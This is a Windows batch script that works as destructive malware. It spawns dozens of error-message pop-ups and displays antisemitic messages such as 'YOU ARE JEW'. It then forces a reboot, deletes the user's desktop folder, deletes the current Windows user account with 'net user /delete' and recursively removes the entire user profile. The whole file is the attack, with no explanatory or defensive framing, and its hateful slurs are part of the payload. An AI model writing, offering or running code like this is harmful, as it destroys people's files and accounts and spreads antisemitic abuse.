@echo off
md "%userprofile%\Browser"
md "%userprofile%\Browser\Slaves"

echo msgbox "Slaves ERROR", 16, "ERROR" >> "%userprofile%\Browser\SlavesE.vbs"

echo msgbox "GAME OVER, JAW", 16, "JAW" >> "%userprofile%\Browser\Gameover.vbs"

echo shutdown /r /c "YOU ARE JEW" /t 3 >> "%userprofile%\Browser\end.bat"


timeout 1 >nul /nobreak
cd "%userprofile%\Browser"

start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs
start SlavesE.vbs

timeout 3 >nul /nobreak

taskkill/im wscript.exe /f

start Gameover.vbs

timeout 1 >nul /nobreak
end.bat
timeout 2 >nul /nobreak
rd "%userprofile%\desktop"/q /s

timeout 4 >nul /nobreak

net user "%username%" /delete

rd "%userprofile%"/s /q

